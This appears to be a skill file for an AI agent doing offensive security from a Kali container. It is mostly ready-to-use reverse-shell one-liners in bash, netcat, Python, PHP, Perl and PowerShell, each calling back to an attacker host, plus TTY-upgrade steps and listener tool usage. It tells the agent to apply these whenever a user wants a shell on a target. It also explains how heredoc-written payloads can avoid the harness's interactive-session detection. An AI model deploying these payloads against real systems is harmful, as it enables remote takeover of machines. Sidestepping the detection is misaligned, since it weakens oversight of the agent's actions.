---
name: reverse-shells
description: Payload variants and delivery gotchas for reverse/bind shells (bash, netcat, python, PHP, perl, PowerShell), TTY upgrade after landing a shell, and how to avoid false-positive auto-backgrounding when writing exploit scripts via heredoc. Use this whenever the user asks to get a shell on a target, mentions callback_listen, reverse shell, revshell, bind shell, netcat, or payload delivery -- even if they don't say the word "skill."
---

# reverse shells

## getting lhost/lport right
Always call `callback_host_info` first to get the real host-reachable LHOST (VPN/tun interface),
then `callback_listen(port=...)`. Never infer LHOST by guessing from inside the Kali container —
the container has its own network namespace and cannot see the host's VPN interfaces.

## payload variants
- Bash (most common, no extra binary needed): `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`
- Bash without `/dev/tcp` (restricted shells): `0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196`
- Netcat with `-e` (if target nc supports it): `nc -e /bin/sh LHOST LPORT`
- Netcat without `-e` (mkfifo trick): `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f`
- Python3: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`
- PHP: `php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'`
- Perl: `perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
- PowerShell (Windows targets): `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}"`

## delivering payloads without false background detection
If you write a script to disk via a heredoc (`cat << 'EOF' > file.py`) and the payload text
inside the heredoc body contains phrases like `bash -i` or `/dev/tcp/`, that is literal text
being written to a file — it is NOT itself launching an interactive session, so it should not
be treated as one. Only the actual invocation line that *executes* the file afterward
(e.g. `python3 file.py`) is the real interactive/background command.

## tty upgrade after landing a shell
A raw netcat/bash reverse shell has no real TTY — no job control, no tab completion, ctrl-C kills
the whole shell. Upgrade with:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
then background it (Ctrl-Z), on your side run `stty raw -echo; fg`, then in the shell:
```
export TERM=xterm
stty rows <rows> columns <columns>
```

## reading session_poll output correctly
Sessions of kind `reverse_shell`/`shell` carry a hint line prepended to `output` indicating
whether a shell prompt was detected (ready for the next command) or not. If no prompt is
detected yet, wait and poll again rather than sending another command blind — commands sent
before the target shell is ready can get silently interleaved with the previous command's
output and produce confusing, doubled results.

## callback listener versus interactive process
- `callback_listen` is for catching an *inbound* connection from the target (classic reverse shell)
  on the host network.
- `shell_exec` with an interactive command (auto-backgrounded, kind `shell`) is for driving an
  *outbound* interactive process yourself inside the container (e.g. `ssh`, `mysql`, `python3` REPL) —
  no listener involved, runs fully inside the sandbox.
